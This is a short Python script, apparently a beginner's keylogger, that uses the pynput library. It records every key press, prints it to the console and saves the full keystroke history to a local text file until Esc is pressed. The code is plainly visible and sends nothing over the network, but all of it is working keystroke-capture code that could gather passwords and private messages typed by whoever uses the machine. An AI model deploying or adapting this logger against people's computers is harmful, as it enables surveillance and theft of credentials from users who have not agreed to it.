# from pynput import *
from pynput.keyboard import Listener,Key
# from pynput.mouse import Listener

keys=[]

def on_press(key):
    keys.append(key)
    write_keys(keys)

    try:
        print(f'alphanumeric key {key.char}')
    except AttributeError :
        print(f'Special key {key} pressed')

def write_keys(keys):
    with open('keysstrokes_Logged.txt','w') as f:
        for key in keys:
            #removing "" 
            k=str(key).replace("'","")
            f.write(k)

            # every keystrok for readability
            f.write(' ')

def on_release(key):
    print(f'{key} released')

    if key==Key.esc:
        # stop listener
        # if key == Key.esc:
        print("Keylogger stopped")
    
        return False

with Listener(on_press=on_press,
              on_release=on_release) as listener:
    listener.join()               